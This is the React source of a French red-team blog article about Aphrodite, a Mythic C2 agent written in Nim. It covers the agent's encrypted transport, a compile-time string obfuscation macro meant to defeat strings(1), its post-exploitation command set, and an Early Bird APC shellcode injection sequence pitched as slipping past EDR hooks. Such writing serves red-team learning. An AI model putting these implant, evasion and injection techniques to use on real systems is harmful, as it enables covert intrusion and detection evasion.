import Image from "next/image";
import {
  Heart,
  Layers,
  Terminal,
  Globe,
  Shield,
  Code2,
  List,
  Zap,
  ArrowLeftRight,
  Settings,
  Eye,
  AlertTriangle,
} from "lucide-react";
import { PageHeader } from "@/components/PageHeader";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p
          className={`mb-1 text-xs font-mono ${
            result ? "text-primary" : "text-muted-foreground"
          }`}
        >
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

function InfoBox({ children }: { children: React.ReactNode }) {
  return (
    <div className="my-4 rounded-lg border border-primary/30 bg-primary/5 px-5 py-4 text-sm text-muted-foreground">
      {children}
    </div>
  );
}

export const metadata = {
  title: "J'ai codé mon propre agent Mythic en Nim | 0xbbuddha",
  description:
    "Inspiré par Athena, j'ai voulu comprendre comment un agent C2 fonctionne vraiment de l'intérieur. Résultat : Aphrodite, un agent Mythic cross-platform en Nim. Binaire natif, chiffrement AES-256 + EKE RSA-2048, obfuscation des strings à la compilation, EarlyBird APC, SOCKS5 et 42 commandes.",
};

export default function ArticleAphroditePage() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
      <PageHeader
        eyebrow="Article · Red Team"
        title="J'ai codé mon propre agent Mythic en Nim"
        description="Inspiré par Athena, j'ai voulu comprendre comment un agent C2 fonctionne vraiment de l'intérieur. Résultat : Aphrodite, un agent Mythic cross-platform en Nim. Binaire natif, chiffrement AES-256 + EKE RSA-2048, obfuscation des strings à la compilation, EarlyBird APC, SOCKS5 et 42 commandes."
        breadcrumbs={[
          { label: "README", href: "/" },
          { label: "Blog", href: "/blog" },
          { label: "Aphrodite" },
        ]}
        stats={[
          { label: "Category", value: "Red Team" },
          { label: "Tags", value: "Mythic · C2 · Nim" },
          { label: "Date", value: "2026-04-07" },
        ]}
      />

      <article className="mt-8 space-y-12">

        {/* L'idée */}
        <section className="rounded-lg border border-primary/20 bg-primary/5 p-6">
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Heart className="size-5 text-primary" />
            L&apos;idée
          </h2>
          <p className="text-muted-foreground mb-3">
            Tout a commencé en lisant l&apos;article de{" "}
            <a
              href="https://blog.checkymander.com/red%20team/c2/Athena/"
              target="_blank"
              rel="noopener noreferrer"
              className="text-primary underline underline-offset-4 hover:no-underline"
            >
              Scottie Austin sur Athena
            </a>
            , son agent Mythic écrit en .NET 6. Ce qui m&apos;avait marqué,
            c&apos;était sa démarche : prendre Mythic comme base pour ne pas
            avoir à gérer l&apos;UI et le back-end, et se concentrer sur
            l&apos;agent lui-même. J&apos;avais exactement la même envie.
            Coder un agent C2, comprendre comment ça marche de l&apos;intérieur,
            sans passer des semaines sur du front-end.
          </p>
          <p className="text-muted-foreground mb-3">
            Athena m&apos;a beaucoup appris sur la structure d&apos;un agent
            Mythic. J&apos;ai épluché son code pour comprendre le protocole de
            checkin, le format des messages, comment les commandes sont
            dispatchées. Mais j&apos;avais envie de faire quelque chose de
            différent sur la stack technique. Athena repose sur .NET 6, ce qui
            est une excellente idée pour quelqu&apos;un à l&apos;aise avec C#.
            Moi, j&apos;avais envie d&apos;explorer <strong>Nim</strong>, un
            langage que je trouvais particulièrement bien adapté à cet
            use-case : compilation vers du C natif, pas de runtime, et un
            cross-compile vers Windows depuis Linux qui fonctionne vraiment.
          </p>
          <p className="text-muted-foreground mb-3">
            Les objectifs étaient clairs dès le départ. Un binaire natif sans
            dépendances sur la cible, support Linux et Windows depuis le même
            codebase, un modèle de chiffrement sérieux avec échange de clé à
            runtime, et assez de commandes pour être utile en opération réelle.
            Pas de plugin system ni de chargement dynamique, à l&apos;inverse
            d&apos;Athena. Tout est compilé statiquement. Moins flexible sur
            le papier, mais beaucoup plus simple à maintenir et à prédire.
          </p>
          <p className="text-muted-foreground">
            Le nom vient de la déesse grecque de la beauté. Un binaire natif
            compilé proprement, c&apos;est quand même plus élégant
            qu&apos;un interpréteur embarqué.
          </p>
        </section>

        {/* Sommaire */}
        <section className="rounded-lg border border-border bg-card p-6">
          <h2 className="mb-3 font-mono text-sm font-semibold text-primary uppercase tracking-widest">
            Sommaire
          </h2>
          <ol className="list-decimal list-inside space-y-1 text-sm text-muted-foreground font-mono">
            <li>Qu&apos;est-ce qu&apos;Aphrodite ?</li>
            <li>Installation</li>
            <li>Profils C2 : HTTP et WebSocket</li>
            <li>Modèle de chiffrement : PSK, EKE, Plaintext</li>
            <li>Obfuscation des strings</li>
            <li>Commandes</li>
            <li>Early Bird APC injection (Windows)</li>
            <li>SOCKS5</li>
            <li>Options de build</li>
            <li>Considérations OPSEC</li>
            <li>Limitations et TODO</li>
          </ol>
        </section>

        {/* 1. Qu'est-ce qu'Aphrodite */}
        <section>
          <h2 className="mb-6 flex items-center gap-2 font-mono text-xl font-semibold">
            <Layers className="size-5 text-primary" />
            1. Qu&apos;est-ce qu&apos;Aphrodite ?
          </h2>
          <div className="flex justify-center mb-8">
            <Image
              src="/aphrodite.svg"
              alt="Aphrodite agent logo"
              width={160}
              height={160}
              className="opacity-90"
            />
          </div>
          <p className="text-muted-foreground mb-3">
            Aphrodite est un agent Mythic C2 léger, cross-platform, écrit en
            Nim et conçu pour Mythic 3.0+. Il se compile vers un binaire natif,
            sans aucun runtime Nim ni dépendance sur la cible. Linux et Windows
            sont supportés depuis le même codebase, et les binaires Windows sont
            cross-compilés depuis Linux via{" "}
            <code className="rounded bg-muted px-1">mingw-w64</code>.
          </p>
          <p className="text-muted-foreground mb-3">
            L&apos;agent supporte deux profils C2 (HTTP et WebSocket), trois
            modes de chiffrement (PSK, EKE, plaintext), une double couche
            d&apos;obfuscation des strings, et 42 commandes built-in couvrant
            la reconnaissance, les opérations filesystem, l&apos;exécution, le
            transfert de fichiers, la gestion de l&apos;environnement et le
            contrôle de l&apos;agent.
          </p>
          <InfoBox>
            <strong>Nim compile vers du C, qui compile vers un binaire natif.</strong>{" "}
            Sur Linux, la chaîne standard{" "}
            <code className="rounded bg-muted px-1">gcc</code> est utilisée. Sur
            Windows (cross-compile depuis Linux),{" "}
            <code className="rounded bg-muted px-1">x86_64-w64-mingw32-gcc</code>{" "}
            prend le relais. Au final, on obtient un ELF ou un PE autonome, sans
            interpréteur.
          </InfoBox>
          <p className="text-muted-foreground mb-3">
            La structure du projet côté agent code suit une organisation par
            responsabilité :
          </p>
          <CodeBlock title="Arborescence agent_code/src/">
{`src/
├── aphrodite.nim          # Point d'entrée, instancie et lance l'agent
├── config.nim             # Généré au build : UUID, C2 URL, PSK, killdate...
├── core/
│   ├── agent.nim          # Boucle principale C2, checkin, dispatch des tasks
│   ├── jobs.nim           # Gestionnaire de jobs interactifs (shell sessions)
│   ├── types.nim          # Types partagés (AgentState, TaskResult, SendMsg...)
│   └── utils.nim          # Helpers système (username, hostname, IP, PID...)
├── crypto/
│   ├── aes.nim            # AES-256-CBC + HMAC-SHA256 (chiffrement des messages)
│   ├── eke.nim            # EKE, échange de clé RSA-2048 via OpenSSL
│   ├── obf.nim            # Déobfuscation runtime des config strings (XOR / AES)
│   └── strenc.nim         # Macro hidstr, obfuscation compile-time des strings
├── transport/
│   ├── http.nim           # Transport HTTP (POST, format Mythic)
│   └── websocket.nim      # Transport WebSocket (RFC 6455 minimal, stdlib only)
├── proxy/
│   ├── socks5.nim         # Parser SOCKS5 CONNECT (RFC 1928)
│   └── socks_mgr.nim      # Gestionnaire de connexions TCP pour le proxy
└── commands/
    ├── registry.nim       # Registre des commandes (map nom -> handler)
    ├── filesystem/        # ls, cat, cd, pwd, mkdir, rm, mv, cp, tail, chmod...
    ├── recon/             # whoami, ps, hostname, ifconfig, arp, nslookup...
    ├── execution/         # shell, psh, sudo, runas, earlybird
    ├── transfer/          # download, upload
    ├── env/               # env, getenv, setenv
    └── control/           # sleep, exit, kill, echo, socks, jobs, jobkill, config`}
          </CodeBlock>
        </section>

        {/* 2. Installation */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            2. Installation
          </h2>
          <p className="text-muted-foreground mb-3">
            Depuis un serveur Mythic déjà installé, une seule commande suffit :
          </p>
          <CodeBlock title="Installation depuis GitHub">
{`cd /opt/Mythic
./mythic-cli install github https://github.com/0xbbuddha/aphrodite`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            Mythic télécharge le repo, build l&apos;image Docker du container
            Aphrodite, et enregistre le payload type dans l&apos;interface. Une
            fois installé, Aphrodite apparaît dans{" "}
            <strong>Payload Types</strong> et est prêt à être utilisé pour
            générer des payloads.
          </p>
          <InfoBox>
            Le container Aphrodite embarque Nim, nimcrypto et mingw-w64. Tout
            le toolchain de compilation est isolé dedans, donc pas besoin
            d&apos;installer quoi que ce soit sur le serveur Mythic lui-même.
          </InfoBox>
          <p className="text-muted-foreground mb-3">
            <strong>Note sur nimcrypto :</strong> la bibliothèque{" "}
            <code className="rounded bg-muted px-1">nimcrypto</code> est
            nécessaire pour le chiffrement AES. Le builder vérifie sa présence
            dans{" "}
            <code className="rounded bg-muted px-1">
              /opt/nim/lib/nimcrypto/
            </code>{" "}
            au moment du build. Si elle est absente (container non rebuild
            depuis une modification du Dockerfile), le build échoue avec un
            message explicite :
          </p>
          <CodeBlock title="Erreur nimcrypto manquant" result>
{`Error: nimcrypto not found at /opt/nim/lib/nimcrypto/.
Run in the container:
  git clone --depth 1 https://github.com/cheatfate/nimcrypto.git /tmp/nc
  cp -r /tmp/nc/nimcrypto /opt/nim/lib/nimcrypto
Or rebuild the container: sudo ./mythic-cli build aphrodite`}
          </CodeBlock>
        </section>

        {/* 3. Profils C2 */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Globe className="size-5 text-primary" />
            3. Profils C2 : HTTP et WebSocket
          </h2>
          <p className="text-muted-foreground mb-3">
            Aphrodite supporte deux profils C2. Le profil est sélectionné au
            moment de la génération du payload dans l&apos;UI Mythic. Un seul
            profil par binaire, compilé via flag de compilation Nim.
          </p>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            HTTP
          </h3>
          <p className="text-muted-foreground mb-3">
            Le transport HTTP utilise le profil HTTP standard de Mythic. Toutes
            les communications passent par des POST. Le format des messages
            suit l&apos;enveloppe Mythic :
          </p>
          <CodeBlock title="Format d'un message HTTP (PSK mode)">
{`POST /agent_endpoint HTTP/1.1
Content-Type: application/octet-stream
User-Agent: <configuré au build>

base64(
  uuid[36 bytes]            <- UUID de l'agent (padded avec \x00)
  IV[16 bytes]              <- IV aléatoire AES-CBC
  ciphertext[variable]      <- JSON chiffré en AES-256-CBC
  HMAC-SHA256[32 bytes]     <- HMAC sur IV + ciphertext
)`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            En mode plaintext (pas de PSK), l&apos;enveloppe devient simplement{" "}
            <code className="rounded bg-muted px-1">base64(uuid[36] + json_bytes)</code>.
            Mythic reçoit, vérifie, décrypte, et renvoie une réponse dans le
            même format.
          </p>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            WebSocket
          </h3>
          <p className="text-muted-foreground mb-3">
            Le transport WebSocket maintient une connexion persistante vers le
            serveur Mythic. L&apos;implémentation utilise uniquement la stdlib
            Nim, sans dépendance externe. C&apos;est un RFC 6455 minimal,
            suffisant pour les échanges avec Mythic. L&apos;enveloppe des
            messages suit le format Mythic WebSocket :
          </p>
          <CodeBlock title="Enveloppe WebSocket">
{`// Envoi agent -> Mythic
{"client": true, "data": "<base64_uuid_encrypted>", "tag": ""}

// Réception Mythic -> agent
{"client": false, "data": "<base64_uuid_encrypted>", "tag": ""}`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            Le contenu du champ{" "}
            <code className="rounded bg-muted px-1">data</code> est identique
            au body HTTP, même format d&apos;enveloppe uuid + chiffrement.
            Le transport est complètement transparent pour le reste de
            l&apos;agent.
          </p>
          <p className="text-muted-foreground mb-3">
            Le profil est sélectionné à la compilation via un define Nim :
          </p>
          <CodeBlock title="Sélection du profil C2 à la compilation">
{`# HTTP (défaut)
nim c src/aphrodite.nim

# WebSocket
nim c -d:c2ProfileWs src/aphrodite.nim`}
          </CodeBlock>
        </section>

        {/* 4. Modèle de chiffrement */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            4. Modèle de chiffrement : PSK, EKE, Plaintext
          </h2>
          <p className="text-muted-foreground mb-3">
            Aphrodite supporte trois modes de chiffrement, configurés dans
            l&apos;UI Mythic au moment de la génération du payload.
          </p>

          <div className="overflow-x-auto my-4">
            <table className="w-full text-sm font-mono border-collapse">
              <thead>
                <tr className="border-b border-border">
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Mode</th>
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Description</th>
                  <th className="text-left py-2 text-muted-foreground font-semibold">Plateformes</th>
                </tr>
              </thead>
              <tbody className="text-muted-foreground">
                <tr className="border-b border-border/50">
                  <td className="py-2 pr-4"><code className="rounded bg-muted px-1">PSK</code></td>
                  <td className="py-2 pr-4">AES-256-CBC + HMAC-SHA256, clé pré-partagée compilée dans le binaire</td>
                  <td className="py-2">Linux, Windows</td>
                </tr>
                <tr className="border-b border-border/50">
                  <td className="py-2 pr-4"><code className="rounded bg-muted px-1">EKE</code></td>
                  <td className="py-2 pr-4">Échange de clé RSA-2048 au staging, clé AES de session négociée à runtime</td>
                  <td className="py-2">Linux uniquement</td>
                </tr>
                <tr>
                  <td className="py-2 pr-4"><code className="rounded bg-muted px-1">Plaintext</code></td>
                  <td className="py-2 pr-4">Pas de chiffrement (AESPSK vide), pour le lab et le debug uniquement</td>
                  <td className="py-2">Linux, Windows</td>
                </tr>
              </tbody>
            </table>
          </div>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            PSK (Pre-Shared Key)
          </h3>
          <p className="text-muted-foreground mb-3">
            La clé AES est générée par Mythic, encodée en base64, et compilée
            dans le binaire via{" "}
            <code className="rounded bg-muted px-1">config.nim</code>. Au
            démarrage, l&apos;agent décode la clé base64 et l&apos;utilise pour
            chiffrer tous les messages. Le schéma est AES-256-CBC avec un IV
            aléatoire par message, et HMAC-SHA256 pour l&apos;intégrité.
          </p>
          <p className="text-muted-foreground mb-3">
            Dans l&apos;UI Mythic, PSK correspond à décocher{" "}
            <strong>Encrypted Key Exchange</strong> dans les paramètres du
            profil C2.
          </p>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            EKE (Encrypted Key Exchange)
          </h3>
          <p className="text-muted-foreground mb-3">
            Le mode EKE suit le protocole{" "}
            <code className="rounded bg-muted px-1">staging_rsa</code> de
            Mythic. L&apos;agent génère une paire RSA-2048 à runtime via
            OpenSSL, envoie sa clé publique au serveur Mythic, et reçoit en
            retour une clé AES de session chiffrée avec cette clé publique.
            Toutes les communications suivantes utilisent cette clé AES
            négociée.
          </p>
          <CodeBlock title="core/agent.nim : séquence EKE (staging_rsa)">
{`// 1. Générer la paire RSA-2048
var ctx = ekaGenerate()

// 2. Envoyer la clé publique (DER base64) au serveur
let jsonBody = {"action": "staging_rsa",
                "pub_key": ctx.ekaPublicKeyB64(),
                "session_id": sessionId}

// 3. Mythic retourne : uuid + session_key chiffrée RSA-OAEP
let aesKey = ctx.ekaDecryptSessionKey(resp["session_key"])

// 4. Toutes les comms suivantes utilisent aesKey (AES-256-CBC)`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            L&apos;initialisation EKE nécessite OpenSSL au link. Pour les
            targets Linux, OpenSSL est linké statiquement dans le binaire
            (<code className="rounded bg-muted px-1">-Wl,-Bstatic -lssl -lcrypto</code>).
            La chaîne mingw-w64 utilisée pour cross-compiler vers Windows
            n&apos;embarque pas OpenSSL, donc EKE est automatiquement désactivé
            sur les builds Windows. Le builder le signale et bascule en PSK.
          </p>
          <InfoBox>
            Le mode EKE protège contre la réutilisation de la clé PSK. Même si
            un analyste extrait la PSK du binaire, il ne peut pas déchiffrer
            les sessions EKE car la clé AES de session est unique par
            exécution et n&apos;est jamais stockée en dur.
          </InfoBox>
        </section>

        {/* 5. Obfuscation des strings */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Code2 className="size-5 text-primary" />
            5. Obfuscation des strings
          </h2>
          <p className="text-muted-foreground mb-3">
            Aphrodite utilise deux couches d&apos;obfuscation indépendantes.
          </p>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Couche 1 : hidstr (toujours active)
          </h3>
          <p className="text-muted-foreground mb-3">
            <code className="rounded bg-muted px-1">hidstr</code> est une macro
            Nim qui chiffre chaque string littérale à la{" "}
            <strong>compilation</strong> par XOR avec une clé dérivée de la
            position. À runtime, la chaîne est décodée juste avant
            utilisation. Aucune string en clair n&apos;apparaît dans le binaire
            compilé.
          </p>
          <CodeBlock title="crypto/strenc.nim : macro hidstr">
{"macro hidstr*(s: static string): string =\n  ## Rolling key: k(i) = 0x5F xor byte((i * 7) and 0xFF)\n  ## Chaque byte XOR'd au compile-time, décodé au runtime.\n  let n = s.len\n  var arrNode = nnkBracket.newTree()\n  for i in 0..<n:\n    let k = byte(0x5F) xor byte((i * 7) and 0xFF)\n    arrNode.add(newLit(byte(s[i]) xor k))\n  result = quote do:\n    block:\n      const enc: array[`nLit`, byte] = `arrNode`\n      var dec = newString(`nLit`)\n      for i in 0..<`nLit`:\n        dec[i] = char(enc[i] xor (byte(0x5F) xor byte((i * 7) and 0xFF)))\n      dec"}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            Cette macro est utilisée sur <em>toutes</em> les strings sensibles
            du codebase : noms de commandes, clés de protocole Mythic (
            <code className="rounded bg-muted px-1">checkin</code>,{" "}
            <code className="rounded bg-muted px-1">get_tasking</code>,{" "}
            <code className="rounded bg-muted px-1">staging_rsa</code>), syscalls (
            <code className="rounded bg-muted px-1">/bin/sh -c</code>,{" "}
            <code className="rounded bg-muted px-1">cmd.exe /c</code>,{" "}
            <code className="rounded bg-muted px-1">hostname</code>,{" "}
            <code className="rounded bg-muted px-1">id -un</code>), noms de
            variables d&apos;environnement, etc.
          </p>
          <CodeBlock title="Exemple d'utilisation dans le codebase">
{`// strings(1) ne verra aucune de ces chaînes en clair
proc getUsername*(): string =
  result = getEnv(hidstr("USER"), getEnv(hidstr("LOGNAME"), ""))

proc getHostname*(): string =
  let (output, _) = execCmdEx(hidstr("hostname"))

// Protocole Mythic, aussi obfusqué
let msg = %*{"action": hidstr("checkin"), "uuid": ag.payloadUUID}`}
          </CodeBlock>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Couche 2 : obfuscation des config strings (optionnelle)
          </h3>
          <p className="text-muted-foreground mb-3">
            En parallèle, le builder peut encoder les valeurs de configuration
            (C2 URL, UUID, PSK, killdate, User-Agent) dans{" "}
            <code className="rounded bg-muted px-1">config.nim</code> avant
            compilation. L&apos;option{" "}
            <code className="rounded bg-muted px-1">obfuscation</code> au build
            accepte trois valeurs :
          </p>
          <div className="overflow-x-auto my-4">
            <table className="w-full text-sm font-mono border-collapse">
              <thead>
                <tr className="border-b border-border">
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Option</th>
                  <th className="text-left py-2 text-muted-foreground font-semibold">Comportement</th>
                </tr>
              </thead>
              <tbody className="text-muted-foreground">
                <tr className="border-b border-border/50">
                  <td className="py-2 pr-4"><code className="rounded bg-muted px-1">none</code></td>
                  <td className="py-2">Strings de config en clair dans config.nim, protégées uniquement par hidstr</td>
                </tr>
                <tr className="border-b border-border/50">
                  <td className="py-2 pr-4"><code className="rounded bg-muted px-1">xor</code></td>
                  <td className="py-2">Strings de config XOR-encodées avec une clé aléatoire de 16 bytes, décodées à runtime via obf.nim</td>
                </tr>
                <tr>
                  <td className="py-2 pr-4"><code className="rounded bg-muted px-1">aes</code></td>
                  <td className="py-2">Strings de config chiffrées en AES-128-CBC, décodées à runtime via obf.nim</td>
                </tr>
              </tbody>
            </table>
          </div>
          <p className="text-muted-foreground mb-3">
            L&apos;encodage est fait par le builder Python au moment de la
            génération du payload, avec une clé et un IV aléatoires à chaque
            build. Deux binaires générés avec les mêmes paramètres auront des
            représentations différentes de leurs config strings dans le code objet.
          </p>
          <CodeBlock title="config.nim généré en mode obfuscation=xor (extrait)">
{`import crypto/obf
const
  obfKey      = [0x3a'u8, 0x7f'u8, 0x12'u8, ...]   # clé aléatoire 16 bytes
  encAgentUUID = [0x4e'u8, 0x2b'u8, 0x91'u8, ...]   # UUID XOR-encodé
  encC2BaseUrl = [0x71'u8, 0x05'u8, 0xc3'u8, ...]   # URL XOR-encodée
  ...

let AgentUUID* = xorDecode(encAgentUUID, obfKey)
let C2BaseUrl* = xorDecode(encC2BaseUrl, obfKey)`}
          </CodeBlock>
          <InfoBox>
            Les deux couches sont indépendantes et cumulatives.{" "}
            <code className="rounded bg-muted px-1">hidstr</code> obfusque
            toutes les strings du code source au niveau macro Nim (toujours
            actif), et l&apos;option{" "}
            <code className="rounded bg-muted px-1">obfuscation</code> encode
            en plus les valeurs de configuration au niveau du builder Python.
            Un <code className="rounded bg-muted px-1">strings(1)</code> sur le
            binaire final ne révèle ni les commandes, ni les clés de protocole,
            ni les paramètres de configuration.
          </InfoBox>
        </section>

        {/* 6. Commandes */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <List className="size-5 text-primary" />
            6. Commandes
          </h2>
          <p className="text-muted-foreground mb-3">
            Aphrodite embarque 42 commandes organisées en six catégories. Toutes
            sont enregistrées dans un registre central au démarrage de
            l&apos;agent. Le dispatch se fait par lookup du nom de commande
            dans ce registre, sans aucun switch/case en dur.
          </p>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">Filesystem</h3>
          <div className="overflow-x-auto my-4">
            <table className="w-full text-sm font-mono border-collapse">
              <thead>
                <tr className="border-b border-border">
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Commande</th>
                  <th className="text-left py-2 text-muted-foreground font-semibold">Description</th>
                </tr>
              </thead>
              <tbody className="text-muted-foreground">
                {[
                  ["cat", "Afficher le contenu d'un fichier"],
                  ["cd", "Changer de répertoire courant"],
                  ["cp", "Copier un fichier ou dossier"],
                  ["mv", "Déplacer / renommer"],
                  ["rm", "Supprimer un fichier ou dossier"],
                  ["ls", "Lister le contenu d'un répertoire"],
                  ["mkdir", "Créer un répertoire"],
                  ["pwd", "Afficher le répertoire courant"],
                  ["tail", "Afficher les dernières lignes d'un fichier"],
                  ["find", "Rechercher des fichiers par nom/pattern"],
                  ["write", "Écrire du contenu dans un fichier"],
                  ["chmod", "Modifier les permissions (Linux)"],
                  ["chown", "Modifier le propriétaire (Linux)"],
                  ["drives", "Lister les lecteurs montés"],
                ].map(([cmd, desc]) => (
                  <tr key={cmd} className="border-b border-border/50">
                    <td className="py-2 pr-4"><code className="rounded bg-muted px-1">{cmd}</code></td>
                    <td className="py-2">{desc}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">Reconnaissance</h3>
          <div className="overflow-x-auto my-4">
            <table className="w-full text-sm font-mono border-collapse">
              <thead>
                <tr className="border-b border-border">
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Commande</th>
                  <th className="text-left py-2 text-muted-foreground font-semibold">Description</th>
                </tr>
              </thead>
              <tbody className="text-muted-foreground">
                {[
                  ["whoami", "Utilisateur courant"],
                  ["hostname", "Nom de la machine"],
                  ["ps", "Lister les processus"],
                  ["ifconfig", "Interfaces réseau et adresses IP"],
                  ["arp", "Table ARP"],
                  ["nslookup", "Résolution DNS"],
                  ["netstat", "Connexions réseau actives"],
                  ["uptime", "Uptime du système"],
                ].map(([cmd, desc]) => (
                  <tr key={cmd} className="border-b border-border/50">
                    <td className="py-2 pr-4"><code className="rounded bg-muted px-1">{cmd}</code></td>
                    <td className="py-2">{desc}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">Exécution</h3>
          <div className="overflow-x-auto my-4">
            <table className="w-full text-sm font-mono border-collapse">
              <thead>
                <tr className="border-b border-border">
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Commande</th>
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Description</th>
                  <th className="text-left py-2 text-muted-foreground font-semibold">Plateformes</th>
                </tr>
              </thead>
              <tbody className="text-muted-foreground">
                {[
                  ["shell", "Exécuter une commande shell (/bin/sh ou cmd.exe)", "Linux, Windows"],
                  ["psh", "Exécuter via PowerShell", "Windows"],
                  ["sudo", "Exécuter avec sudo", "Linux"],
                  ["runas", "Exécuter en tant qu'un autre utilisateur", "Linux, Windows"],
                  ["earlybird", "Early Bird APC injection", "Windows uniquement"],
                ].map(([cmd, desc, plat]) => (
                  <tr key={cmd} className="border-b border-border/50">
                    <td className="py-2 pr-4"><code className="rounded bg-muted px-1">{cmd}</code></td>
                    <td className="py-2 pr-4">{desc}</td>
                    <td className="py-2 text-xs">{plat}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">Transfert de fichiers</h3>
          <div className="overflow-x-auto my-4">
            <table className="w-full text-sm font-mono border-collapse">
              <thead>
                <tr className="border-b border-border">
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Commande</th>
                  <th className="text-left py-2 text-muted-foreground font-semibold">Description</th>
                </tr>
              </thead>
              <tbody className="text-muted-foreground">
                {[
                  ["download", "Télécharger un fichier depuis la cible vers Mythic"],
                  ["upload", "Uploader un fichier de Mythic vers la cible"],
                  ["wget", "Télécharger une URL HTTP vers la cible"],
                  ["curl", "Effectuer une requête HTTP depuis la cible"],
                ].map(([cmd, desc]) => (
                  <tr key={cmd} className="border-b border-border/50">
                    <td className="py-2 pr-4"><code className="rounded bg-muted px-1">{cmd}</code></td>
                    <td className="py-2">{desc}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">Environnement et contrôle</h3>
          <div className="overflow-x-auto my-4">
            <table className="w-full text-sm font-mono border-collapse">
              <thead>
                <tr className="border-b border-border">
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Commande</th>
                  <th className="text-left py-2 text-muted-foreground font-semibold">Description</th>
                </tr>
              </thead>
              <tbody className="text-muted-foreground">
                {[
                  ["env", "Lister toutes les variables d'environnement"],
                  ["getenv", "Lire une variable d'environnement"],
                  ["setenv", "Définir une variable d'environnement"],
                  ["sleep", "Modifier l'intervalle de sleep et le jitter"],
                  ["config", "Afficher ou modifier la configuration de l'agent"],
                  ["jobs", "Lister les jobs interactifs actifs"],
                  ["jobkill", "Tuer un job interactif"],
                  ["kill", "Tuer un processus par PID"],
                  ["echo", "Retourner un message (test de connectivité)"],
                  ["socks", "Démarrer ou arrêter le proxy SOCKS5"],
                  ["exit", "Terminer l'agent"],
                ].map(([cmd, desc]) => (
                  <tr key={cmd} className="border-b border-border/50">
                    <td className="py-2 pr-4"><code className="rounded bg-muted px-1">{cmd}</code></td>
                    <td className="py-2">{desc}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>

        {/* 7. Early Bird APC */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Zap className="size-5 text-primary" />
            7. Early Bird APC injection (Windows)
          </h2>
          <p className="text-muted-foreground mb-3">
            La commande{" "}
            <code className="rounded bg-muted px-1">earlybird</code> implémente
            la technique d&apos;injection{" "}
            <strong>Early Bird APC</strong>, disponible uniquement sur les
            agents Windows. Le principe : créer un processus en état{" "}
            <em>suspendu</em>, y écrire du shellcode via{" "}
            <code className="rounded bg-muted px-1">WriteProcessMemory</code>,
            queueer une APC sur le thread principal, puis résumer le processus.
            Le shellcode s&apos;exécute avant même que le point d&apos;entrée
            du processus ne soit appelé.
          </p>
          <CodeBlock title="Séquence Early Bird (commands/execution/earlybird.nim)">
{`// 1. Créer le processus cible en état suspendu
CreateProcessA(nil, processPath, ..., CREATE_SUSPENDED, ..., &pi)

// 2. Allouer de la mémoire RWX dans le processus cible
let remoteMem = VirtualAllocEx(pi.hProcess, nil, shellcode.len,
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE)

// 3. Écrire le shellcode dans la mémoire allouée
WriteProcessMemory(pi.hProcess, remoteMem, &shellcode[0], shellcode.len, &written)

// 4. Queueer une APC pointant vers le shellcode sur le thread suspendu
QueueUserAPC(remoteMem, pi.hThread, 0)

// 5. Résumer le processus, le shellcode s'exécute avant l'entry point
ResumeThread(pi.hThread)`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            La commande prend deux paramètres : le chemin du processus cible et
            le shellcode encodé en base64. Le processus cible doit exister sur
            la machine (par exemple{" "}
            <code className="rounded bg-muted px-1">C:\Windows\System32\notepad.exe</code>).
          </p>
          <InfoBox>
            L&apos;avantage d&apos;Early Bird par rapport à l&apos;injection
            classique : le shellcode s&apos;exécute dans la fenêtre de
            démarrage du processus, avant que les hooks EDR soient
            généralement en place dans le processus cible. C&apos;est une
            technique documentée, mais encore efficace contre une bonne partie
            des solutions de détection. La limitation actuelle est
            l&apos;absence d&apos;un loader dédié, qui sera ajouté dans une
            prochaine version.
          </InfoBox>
        </section>

